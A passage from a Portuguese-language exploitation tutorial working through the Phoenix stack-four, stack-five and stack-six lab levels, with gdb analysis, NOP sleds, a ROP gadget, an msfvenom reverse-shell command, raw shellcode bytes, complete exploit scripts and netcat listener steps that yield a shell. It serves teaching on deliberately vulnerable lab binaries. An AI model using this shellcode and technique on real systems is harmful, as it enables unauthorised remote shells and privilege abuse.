$ python -c &quot;print 'A'*88&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x400000
Segmentation fault
</code></pre>
<p>Isso quer dizer que apoś <strong>88</strong> bytes, temos o SRP :D</p>
<a class="header" href="print.html#-encontrar-endereço-de-complete_level" id="-encontrar-endereço-de-complete_level"><h2>🏠 Encontrar endereço de complete_level</h2></a>
<p>Você se lembra como faz? Nos usamos no exercício passado....</p>
<blockquote>
<p>cof cof objdump -d cof cof</p>
</blockquote>
<pre><code>Se vc quer tentar sozinhx, agora é a sua hora
.
.
.
.
.
.
.
.
.
.
.
.
.
Eai, conseguiu?
</code></pre>
<p>Encontrar endereço:</p>
<pre><code class="language-x86asm">$ objdump -d stack-four | grep complete_level
000000000040061d &lt;complete_level&gt;:
</code></pre>
<p>Exploit:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<p>Esse foi um tutorial beeem longo, e com certeza o mais difícil! Se você chegou até aqui, parabéns! :D</p>
<a class="header" href="print.html#-solução-4" id="-solução-4"><h1>💫 Solução</h1></a>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<ul>
<li><a href="print.html#-objetivo">🎯 Objetivo</a></li>
<li><a href="print.html#-dicas">💡 Dicas</a></li>
<li><a href="print.html#-exploit">🔥 Exploit</a>
<ul>
<li><a href="print.html#analisando-o-programa">Analisando o programa</a></li>
<li><a href="print.html#agora-em-asm-d-analise-est%C3%A1tica">Agora em ASM :D (analise estática)</a>
<ul>
<li><a href="print.html#breakpoint">Breakpoint</a></li>
</ul>
</li>
<li><a href="print.html#agora-vamos-executar-o-programa-analise-din%C3%A2mica">Agora vamos executar o programa (analise dinâmica)</a></li>
<li><a href="print.html#encontrar-endere%C3%A7o-do-buffer">Encontrar endereço do buffer</a></li>
<li><a href="print.html#nop-sled">NOP sled</a></li>
<li><a href="print.html#shellcode">Shellcode</a></li>
<li><a href="print.html#corrigindo-o-problema">Corrigindo o problema</a>
<ul>
<li><a href="print.html#rop-gadgets">ROP Gadgets</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
</ul>
<a class="header" href="print.html#-objetivo-4" id="-objetivo-4"><h1>🎯 Objetivo</h1></a>
<p>Finalmente! Tudo isso para chegar no BOF SRP (clássico) :D</p>
<p>Agora ta na hora de redirecionar o pointer para o nosso código malicioso (shellcode) para ganhar uma shell</p>
<a class="header" href="print.html#-dicas-1" id="-dicas-1"><h1>💡 Dicas</h1></a>
<p>A instrução <code>0xCC</code> (<code>int3</code>) serve para no debugger (como o gdb), para quando o rip chegar nela, a execução pausar (<code>breakpoint</code>). Nos podemos usa-la para testar se
sequer conseguimos executar código, ou se o problema ta no shellcode: Se o debugger avisa que teve <code>SIGTRAP</code>, nos temos execução de código :D</p>
<p>Banco de dados de shellcode: <a href="http://shell-storm.org/shellcode/files/">shell-storm</a></p>
<a class="header" href="print.html#-exploit-2" id="-exploit-2"><h1>🔥 Exploit</h1></a>
<a class="header" href="print.html#analisando-o-programa" id="analisando-o-programa"><h2>Analisando o programa</h2></a>
<p><code>main()</code> printa o banner e chama <code>start_level()</code></p>
<p><code>start_level()</code> cria um buffer[<strong>128</strong>] e salva o output de <code>gets()</code> (<strong>inseguro</strong>)</p>
<p>Como você pode ver, não existe <code>complete_level()</code></p>
<p>Para completar, precisamos executar nosso próprio código (<code>shellcode</code>) e conseguir uma shell (uma linha de comando)</p>
<a class="header" href="print.html#agora-em-asm-d-analise-estática" id="agora-em-asm-d-analise-estática"><h2>Agora em ASM :D (analise estática)</h2></a>
<p>Normalmente, o gdb printa assim:</p>
<pre><code class="language-x86asm">   0x00000000004005a4 &lt;+0&gt;:	push   rbp
   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
</code></pre>
<p>Porem, eu removi os endereços para simplificar, e só mantive os importantes!</p>
<p>Primeiro, vamos ver main</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    &lt;- Prologo
sub    rsp,0x10
   
   
mov    DWORD PTR [rbp-0x4],edi
mov    QWORD PTR [rbp-0x10],rsi   &lt;- args de puts
mov    edi,0x400620
call   0x400400 &lt;puts@plt&gt;        &lt;- call puts
   
   
mov    eax,0x0                    &lt;- args de start_level (nenhum)
call   0x40058d &lt;start_level&gt;     &lt;- call start_level
   
   
mov    eax,0x0                    &lt;- exit code (código de saida, 0=sem erro)
leave                             &lt;- Epilogo  
</code></pre>
<p>Agora vamos ver start_level</p>
<pre><code class="language-x86asm">gef&gt; disassemble start_level 
push   rbp
mov    rbp,rsp                  &lt;- Prologo 
add    rsp,0xffffffffffffff80   
                                
   
lea    rax,[rbp-0x80]         &lt;- rax = Pointer para buffer[128]
mov    rdi,rax                &lt;- rdi = rax

0x000000000040059c &lt;+15&gt;:
call   0x4003f0 &lt;gets@plt&gt;    &lt;- call gets


nop
leave                         &lt;- Epilogo
ret
</code></pre>
<p>Agora vamos adicionar um breakpoint!</p>
<a class="header" href="print.html#breakpoint" id="breakpoint"><h3>Breakpoint</h3></a>
<blockquote>
<p>Breakpoint = ponto de pausa</p>
</blockquote>
<p>Antes daquela intrusão ser executada, sera substituída por <code>0xCC</code>. Isso faz o  debugger pausar a execução do programa naquela instrução!</p>
<p>Quando continuamos executando (normalmente o comando é <strong>continue</strong>), o <code>0xCC</code> é substituído pela instrução certa :D</p>
<p>Se você esta fora de um debugger, <code>0xCC</code> vai fazer o programa sair com erro</p>
<pre><code class="language-x86asm">gef&gt; b *0x000000000040059c
Breakpoint 1 at 0x40059c
</code></pre>
<p>&quot;b&quot; é o comando do gdb para adicionar um breakpoint \
A &quot;*&quot; tem haver com aquele dos pointers \
O endereço é para &quot;<code>call gets</code>&quot;</p>
<blockquote>
<p>Dica: se você selecionar/sublinhar (clique esquerdo e passa o mouse em cima, você sabe do que eu to falando), e clicar o botão do meio no mouse (a rodinha)
o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para você! Então não precisa copiar o endereço manualmente :D</p>
</blockquote>
<a class="header" href="print.html#agora-vamos-executar-o-programa-analise-dinâmica" id="agora-vamos-executar-o-programa-analise-dinâmica"><h2>Agora vamos executar o programa (analise dinâmica)</h2></a>
<p>126 As não causam erro, e 127 As causam... ue, mas pq? não era pra dar erro só em 128?</p>
<pre><code class="language-bash">$ python3 -c &quot;print('A'*126)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

$ python3 -c &quot;print('A'*127)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
</code></pre>
<p>Isso vai ser muito importante no próximo desafio: buffers são terminados com um null byte!</p>
<p>Por enquanto, isso só nos mostra que o compilador não adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D</p>
<p>E nós ja sabemos como controlar o EIP, então agora só precisamos saber para onde redirecionar a execução :)</p>
<a class="header" href="print.html#encontrar-endereço-do-buffer" id="encontrar-endereço-do-buffer"><h2>Encontrar endereço do buffer</h2></a>
<p>Agora dentro do gdb (<strong>gdb stack-five</strong>)</p>
<blockquote>
<p>gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'<em>100)&quot;)</em>*7fff....</p>
</blockquote>
<p>stack
<img src="./img/stack_five/before_gets_2.png" alt="" /></p>
<p>Você também acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P</p>
<p>(((Insira aquele meme muito velho da cabra gritando)))</p>
<p>Então vamos avançar para próxima instrução (step: <code>s</code>) :D
<img src="./img/stack_five/gef_after_gets_0.png" alt="" /></p>
<p>Isso quer dizer que aquele pointer dos argumentos (RDI) agora aponta para os As! :D</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffe5b0              -&gt; x/s é o comando para printar strings
0x7fffffffe5b0:	'A' &lt;repete 140 vezes&gt;
</code></pre>
<p>Então nos ja temos o endereço dos nossos As :D ... que em breve serão shellcode :D</p>
<p>Mas agora precisamos saber com precisão quantos As até o RIP, <code>info frame</code> vai nos ajudar com isso:</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe640:
 rip = 0x4005a1 in start_level  saved rip = 0x4005c7
 called by frame at 0x7fffffffe610
 Arglist at 0x7fffffffe630, args: 
 Locals at 0x7fffffffe630, Previous frame's sp is 0x7fffffffe640
 Saved registers:
  rbp at 0x7fffffffe630, rip at 0x7fffffffe638
</code></pre>
<p>A ultima linha é a mais importante!</p>
<p>RIP em: <code>0x7fffffffe638</code></p>
<p>Então para encontrar precisamente quantos As precisamos colocar até chegarmos no RIP,
basta subtrair <code>endereço do rip salvo - endereço dos As</code></p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; 0x7fffffffe638 - 0x00007fffffffe5b0
136
</code></pre>
<p>Para confirmar isso, vamos rodar com 136 As + BBBB</p>
<p><img src="./img/stack_five/gef_136A_BBBB.png" alt="" /></p>
<p>RIP = BBBB (42424242) :D</p>
<a class="header" href="print.html#nop-sled" id="nop-sled"><h2>NOP sled</h2></a>
<p>Entretanto, como nada pode ser simples nesse mundo do desenvolvimento de exploits, nós não conseguimos saber com precisão que o buffer vai estar naquela localização :(</p>
<p>Isso ocorre pois as envs são alocadas na stack. E elas variam muito, por exemplo, só de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.</p>
<blockquote>
<p>Dica: O gef pode nos ajudar a encontra-las
<img src="./img/stack_five/gef_envs_1.png" alt="" /></p>
</blockquote>
<p>Por exemplo:</p>
<p><img src="./img/stack_five/gef_envs_0.png" alt="" /></p>
<p>Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D</p>
<p>(Outro método de remediação é mencionado em <code>stack-six</code>)</p>
<p>NOP significa &quot;<strong>No</strong> <strong>OP</strong>eration&quot; (<strong>N</strong>enhuma <strong>OP</strong>eração) ! é uma instrução que não faz nada :D</p>
<p>A representação em machine code do NOP é <code>0x90</code> :D Bem fácil de decorar, quem me dera escola fosse fácil assim hehehe :)</p>
<p>O processador vai fazer nada e passar para a próxima, e se nós colocarmos vários desses em sequencia, o RIP vai &quot;deslizando&quot; através até chegar no nosso código!</p>
<p>Você pode imaginar um escorregador :D yuuuuupiii</p>
<p><img src="./img/panda_slide_1.gif" alt="" /></p>
<p>Então a gente redireciona o RIP para o meio do escorregador de NOPs, para ele deslizar até o nosso código :D</p>
<p>Assim, mesmo se o buffer estiverem em um endereço diferente, o RIP vai chegar no nosso shellcode</p>
<p>Para testar isso, vamos usar o truque do <code>0xCC</code> mencionado anteriormente</p>
<p>O input que vai passar vai conter:</p>
<pre><code class="language-x86asm">NOP * 135
0xCC
Endereço para ser colocado no RIP: 0x00007fffffffe5b0 + 70

70 = metade do escorregador (135)
</code></pre>
<p>E os <strong>breakpoints do gdb serão removidos</strong>, então caso encontremos um breakpoint, foi o <code>0xCC</code> acima</p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; hex(0x00007fffffffe5b0 + 70)
'0x7fffffffe5f6'                     - Little Endian -&gt; '\xb6\xe5\xff\xff\xff\x7f'
</code></pre>
<p>Agora executando:</p>
<pre><code class="language-x86asm">r &lt;&lt;&lt; $(python -c &quot;print '\x90' *135 + '\xcc' +'\xb6\xe5\xff\xff\xff\x7f'&quot;)
</code></pre>
<p>Nos recebemos uma SIGTRAP (chegou no breakpoint)</p>
<pre><code class="language-x86asm">[#0] Id 1, Name: &quot;stack-five&quot;, stopped, reason: SIGTRAP
</code></pre>
<p>E na seção <code>code</code> do gef
<img src="./img/stack_five/gef_run_xCC.png" alt="" />
Meio difícil de ver, mas tem:</p>
<pre><code class="language-x86asm">NOP
NOP
INT3
(bad)
(bad)
</code></pre>
<blockquote>
<p>int3 é o nome de 0xCC, da mesma maneira que NOP é o nome de 0x90</p>
</blockquote>
<p>Apos a nossa ultima instrução ha instruções invalidas <code>(bad)</code> que eram o nosso pointer, e logo em seguida o resto do programa normal! :D</p>
<a class="header" href="print.html#shellcode" id="shellcode"><h2>Shellcode</h2></a>
<p>Shellcode é o código malicioso que vai ser executado ( normalmente te dando uma shell (terminal) não autorizada )</p>
<p>Nos podemos usar os do link citado na dica, ou gerar uma usando <code>msfvenom</code> (ja vem instalado no kali linux)</p>
<blockquote>
<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf</p>
</blockquote>
<pre><code>No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 373 bytes
buf =  b&quot;&quot;
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

</code></pre>
<p>Agora, vamos fazer um exploit mais bem feito! <code>vim /tmp/gerar_exploit.py</code></p>
<pre><code class="language-python">buf =  b&quot;&quot;

# shellcode
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# NOP Sled para completar o resto do tamanho
buf = '\x90'*(136-len(buf)) + buf

# ret
buf += b'\xb6\xe5\xff\xff\xff\x7f' 


open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>O script /tmp/gerar_exploit.py vai gerar o que colocaríamos no input, mas ao invés de printarmos para o terminal, vamos salvar em um arquivo binário (por isso o &quot;<code>wb</code>&quot; no <code>open</code>)!</p>
<p>Depois é só ler esse arquivo e redireciona-lo <code>cat /tmp/exploit | ./stack-five</code></p>
</blockquote>
<p>Porem, se tentamos executar esse exploit, recebemos <code>SIGSEV: violação de segmento</code></p>
<a class="header" href="print.html#corrigindo-o-problema" id="corrigindo-o-problema"><h2>Corrigindo o problema</h2></a>
<p>Nessa eu empaquei, e a solução veio daqui: <a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/">blog lamarranet</a></p>
<p>Então valeu pela ajuda :D</p>
<p>Ao invés de colocar o endereço do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um <code>jmp esp</code> por exemplo</p>
<p>E o beneficio é que, por estarmos pulando para uma parte estática, e usando-a para redirecionar para o buffer, não corremos o risco do buffer mudar de endereço!</p>
<p>Isso quer dizer que não precisamos mais do NOP slide :D</p>
<a class="header" href="print.html#rop-gadgets" id="rop-gadgets"><h3>ROP Gadgets</h3></a>
<p>Essa é uma técnica chamada programação <code>ROP</code>, que sera discutida em tutoriais futuros :D  Mas o que você precisa saber por enquanto é que cada um desses <code>jmps</code> é chamado de <strong>gadget</strong></p>
<p>Gadgets são instruções em outras partes do programa, que são reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!</p>
<p>Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamada <code>ROPgadget</code></p>
<pre><code class="language-x86asm">$ ROPgadget --binary stack-five --only &quot;jmp&quot;
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
</code></pre>
<p>Isso quer dizer que, ao pular para <code>0x400481</code>, vamos executar <code>jmp rax</code> e acabar pulando para rax! e para onde rax aponta?</p>
<p>Colocando um break antes do ret de <code>start_level</code>, podemos ver que antes de retornar, rax aponta para o mesmo endereço que rsp, e convenientemente o inicio do nosso buffer
<img src="./img/stack_five/gef_rax.png" alt="" /></p>
<p>rax,rdi e rsp apontam para o inicio do buffer dos As</p>
<p>Assim, não vamos mais precisar do NOP slide: temos um exploit que 100% dos casos vai apontar para o inicio do buffer!</p>
<p>Só precisamos colocar <code>padding</code> entre o shellcode e o RIP</p>
<p>Então vamos modificar o exploit :D</p>
<pre><code>Dica: Shellcode+AAAAA+ret, Little Endian, 136 bytes ate RIP

Se você não quiser ver a solução enquanto tenta!
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<pre><code class="language-python">buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Padding
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>Eu removi o <strong>b&quot;&quot;</strong> pq tava dando problema :(</p>
</blockquote>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code></p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<p><img src="./img/stack_five/Exploit_working.png" alt="" /></p>
<blockquote>
<p>Dica: <code>bash -ip</code> vai deixar a sua shell mais usável</p>
</blockquote>
<p>Se nos tivéssemos executado o programa como root, a nossa shell teria esses privilégios elevados ! :D</p>
<p><img src="./img/stack_five/root_exploit.png" alt="" /></p>
<p><code>UID = 0</code> quer dizer que possuímos privilégios de root, mesmo que o <code>whoami</code> não tenha dito root</p>
<p>E se o programa estivesse exposto para a rede, poderíamos conseguir uma root shell remota :D (spoiler para os próximos desafios hehehe)</p>
<hr />
<p>Você chegou até aqui :D</p>
<p>Toma mais um gif de panda como presente</p>
<p><img src="./img/panda_slide_0.gif" alt="" /></p>
<a class="header" href="print.html#-solução-5" id="-solução-5"><h1>💫 Solução</h1></a>
<blockquote>
<p>vim /tmp/gerar_exploit.py</p>
</blockquote>
<pre><code>buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code></p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<ul>
<li><a href="print.html#-dicas">💡 Dicas</a></li>
<li><a href="print.html#-explica%C3%A7%C3%A3o">🛸 Explicação</a>
<ul>
<li><a href="print.html#analisando-o-programa">Analisando o programa</a>
<ul>
<li><a href="print.html#main">main</a>
<ul>
<li><a href="print.html#dica">Dica</a></li>
</ul>
</li>
<li><a href="print.html#greet">greet</a></li>
</ul>
</li>
<li><a href="print.html#analisando-o-programa-asm">Analisando o programa (ASM)</a>
<ul>
<li><a href="print.html#main-1">main</a></li>
</ul>
</li>
<li><a href="print.html#fuzz">Fuzz</a></li>
<li><a href="print.html#e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a>
<ul>
<li><a href="print.html#curiosidade">Curiosidade</a></li>
</ul>
</li>
<li><a href="print.html#como-ir-de-off-by-one-para-execu%C3%A7%C3%A3o-de-c%C3%B3digo">Como ir de off-by-one para execução de código</a>
<ul>
<li><a href="print.html#ret-com-um-rbp-corrompido">Ret com um RBP corrompido</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-exploit">🔥 Exploit</a>
<ul>
<li><a href="print.html#o-que-controlamos">O que controlamos?</a>
<ul>
<li><a href="print.html#setup">Setup</a></li>
<li><a href="print.html#descobrir-que-partes-da-memoria-controlamos">Descobrir que partes da memoria controlamos</a></li>
<li><a href="print.html#encontrar-para-que-regi%C3%A3o-podemos-apontar-rbp">Encontrar para que região podemos apontar rbp</a></li>
<li><a href="print.html#encontrar-um-pointer-nessa-regi%C3%A3o-que-aponte-para-a-parte-que-controlamos">Encontrar um pointer nessa região que aponte para a parte que controlamos</a></li>
</ul>
</li>
<li><a href="print.html#shellcode">Shellcode</a></li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">💫 Solução</a></li>
</ul>
<a class="header" href="print.html#-dicas-2" id="-dicas-2"><h1>💡 Dicas</h1></a>
<p>Off-by-one BOF</p>
<a class="header" href="print.html#-explicação-4" id="-explicação-4"><h1>🛸 Explicação</h1></a>
<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome é usado para gerar uma mensagem de boas vindas! \
Esse processo de gerar as mensagens é vulnerável a buffer overflow!</p>
<a class="header" href="print.html#analisando-o-programa-1" id="analisando-o-programa-1"><h2>Analisando o programa</h2></a>
<a class="header" href="print.html#main" id="main"><h3>main</h3></a>
<pre><code class="language-C">int main(int argc, char **argv) {
  char *ptr;
  printf(&quot;%s\n&quot;, BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }

  printf(&quot;%s\n&quot;, greet(ptr));
  return 0;
}
</code></pre>
<p>Main começa definindo um pointer (<code>ptr</code>) e printando o banner</p>
<p>Em seguida, faz verificações relacionadas à arquitetura do sistema usando o diretivo:
<code>#ifdef NEWARCH</code>. O diretivo <code>#ifdef NOME</code> checa se a macro chamada <code>NOME</code> existe.</p>
<p>Isso é usado para tornar o inicio da mensagem de boas vindas (gerada por <code>greet</code>) ser dependente da arquitetura!</p>
<p>Por isso nos não a encontramos no código fonte! Mas caso usemos <code>strings</code> conseguimos encontra-las no binário:
<img src="./img/stack_six/Messages_ARCH.png" alt="Diferença entre as arquiteturas" /></p>
<p>Em seguida, main salva o valor da env var &quot;ExploitEducation&quot; no pointer ptr</p>
<p>Depois, é checado se ptr é NULL (a env var não existe)</p>
<p>Caso não exista: usa a função errx() para interromper a execução com uma mensagem de erro! errx() recebe 2 argumento: (código_do_erro, mensagem_do_erro)</p>
<p>No nosso caso:</p>
<pre><code class="language-C">  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }
    // Código de erro: 1
   // Mensagem de erro: Por favor, especifique uma env var chamada ExploitEducation
</code></pre>
<p>Nos podemos confirmar isso usando: <code>echo $?</code>, que printa o código retornado pelo ultimo programa
<img src="./img/stack_six/Exit_Codes_errx.png" alt="0 = sem erro, 1 = erro" /></p>
<blockquote>
<p>0 = sem erro, 1 = erro</p>
</blockquote>
<p>por ultimo, <code>greet()</code> é chamada, e o valor retornado por ela é printado!</p>
<p>E o programa finaliza retornando <code>0</code> (sem erro)!</p>
<a class="header" href="print.html#dica" id="dica"><h4>Dica</h4></a>
<p>Para definir uma env var no gdb</p>
<p><img src="./img/stack_six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
<blockquote>
<p>set environment ExploitEducation=ABC</p>
</blockquote>
<a class="header" href="print.html#greet" id="greet"><h3>greet</h3></a>
<pre><code class="language-C">char *greet(char *who) { // who = nome da pessoa
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize &gt; (sizeof(buffer) - /* garantir terminação com null */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);			// Inicio da mensagem de boas vindas
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}
</code></pre>
<p>Agora chega a parte vulnerável! D:</p>
<p>A função <code>greet</code> recebe um argumento: &quot;who&quot; (quem recebe a mensagem de boas vindas)</p>
<p>São definidas duas variáveis locais: <code>buffer[128]</code> e <code>maxSize</code> (tamanho máximo)</p>
<p>O tamanho de <code>who</code> é salvo em <code>maxSize</code></p>
<blockquote>
<p>Lembrete: Buffers são terminados com um NULL byte, portanto um buffer[128] só armazena 127 letras!</p>
</blockquote>
<p>Em seguida, é checado se <code>maxSize</code> é maior que o <code>tamanho(buffer) - 1</code> (-1 por causa no null byte final)</p>
<p>Caso seja maior, <code>maxSize</code> vai ser definido como o <code>tamanho(buffer) - 1</code> (maxSize = 127)</p>
<blockquote>
<p>Portando, o limite de maxSize é 127</p>
</blockquote>
<p>Essa é uma tentativa de prevenir o buffer overflow! Pois, só seriam copiados 127 bytes, impedindo o overflow D:</p>
<p>Mas aqui que entra o problema: essa contagem não leva em consideração o inicio da mensagem (<code>what</code>)! Aquele que era dependente da arquitetura :D</p>
<p>Então nos vamos acabar escrevendo fora do buffer! Aqui esta a parte do código que causa a vulnerabilidade</p>
<pre><code class="language-C">strcpy(buffer, what); // what = inicio da mensagem
strncpy(buffer, who, maxSize); // who = o valor de ExploitEducation! Quem recebe o oi :D
</code></pre>
<p>Nos ja sabemos como o <code>strcpy</code> funciona (você passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho!
Caso nos conseguíssemos controlar what, poderíamos facilmente exploitar o programa)</p>
<p>str <strong>N</strong> cpy (<code>strncpy</code>) é similar a <code>strcpy</code>, mas recebe um terceiro parâmetro: tamanho!</p>
<p>Esse tamanho é limitado à 127 (limite de <code>maxSize</code>), então teoricamente não seria exploitavel :(</p>
<p><strong>Mas espera ai, ja tinha coisa naquele buffer!!! O inicio da mensagem!!!</strong></p>
<p>O tamanho do inicio é 34 bytes (na versão amd64)</p>
<pre><code class="language-python">$ python3
&gt;&gt;&gt; x = &quot;Welcome, I am pleased to meet you &quot;
&gt;&gt;&gt; len(x)
34
</code></pre>
<p>Isso quer dizer que no buffer cabem 128, mas foram colocados <strong>34 + 127</strong>: Overflow!</p>
<p>Então se não fosse pelo inicio da mensagem, não seria exploitavel :D</p>
<p>Uma maneira de concertar essa vulnerabilidade seria: <code>strncpy(buffer, who, maxSize - sizeof(buffer))</code> (subtrair o tamanho atual)</p>
<a class="header" href="print.html#analisando-o-programa-asm" id="analisando-o-programa-asm"><h2>Analisando o programa (ASM)</h2></a>
<a class="header" href="print.html#main-1" id="main-1"><h3>main</h3></a>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    ; Prologo
sub    rsp,0x20


mov    DWORD PTR [rbp-0x14],edi
mov    QWORD PTR [rbp-0x20],rsi
mov    edi,0x400878
call   0x400530 &lt;puts@plt&gt;        ; printar o banner


mov    edi,0x4008c2               ; o 1º argumento é &quot;ExploitEducation&quot;
call   0x400520 &lt;getenv@plt&gt;      ; Le as env vars e coloca &quot;ExploitEducation&quot; em rax


mov    QWORD PTR [rbp-0x8],rax    ; Pointer para rax
cmp    QWORD PTR [rbp-0x8],0x0    ; Compara esse pointer com 0x0 
                                  ; (Teoricamente &quot;cmp rax, 0x0&quot; também deveria funcionar,
                                  ; mas salvando nesse pointer, podemos usar o valor depois)

jne    0x4007dd &lt;main+66&gt;         ; Jump not equal (pular se a comparação anterior for diferente)
                                  ; Mas pular para onde? Para main+66 (logo depois da mensagem de erro)
                                  ; Ou melhor: Caso ExploitEducation esteja definida, nos não emitimos erro

Essa parte só executa caso ExploitEducation não exista {
        mov    esi,0x4008d8               ; 2º argumento
        mov    edi,0x1                    ; 1º argumento
        mov    eax,0x0                    ; Valor retornado por main
        call   0x400540 &lt;errx@plt&gt;        ; Interrompe a execução e sai com erro
}



        0x4007dd &lt;main+66&gt;:
